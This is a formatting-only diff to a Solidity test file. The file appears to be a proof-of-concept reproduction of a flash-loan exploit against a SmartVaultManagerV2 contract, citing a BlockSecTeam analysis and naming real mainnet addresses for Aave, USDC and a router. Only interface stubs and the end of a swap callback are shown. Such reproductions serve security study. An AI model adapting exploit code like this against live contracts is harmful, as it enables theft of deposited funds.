@@ -13,19 +13,26 @@ import "./../interface.sol";
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1722101942061601052
 interface ISmartVaultManagerV2 {
+
     function mint() external;
     function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external;
+
 }
 
 interface ICurve {
+
     function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
+
 }
 
 interface ISwapFlashLoan {
+
     function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
+
 }
 
 contract ContractTest is Test {
+
     IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
     address router = 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5;
     IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -119,4 +126,5 @@ contract ContractTest is Test {
         secondCrvPool.exchange(1, 2, wbtc.balanceOf(address(this)), 0);
         return true;
     }
+
 }
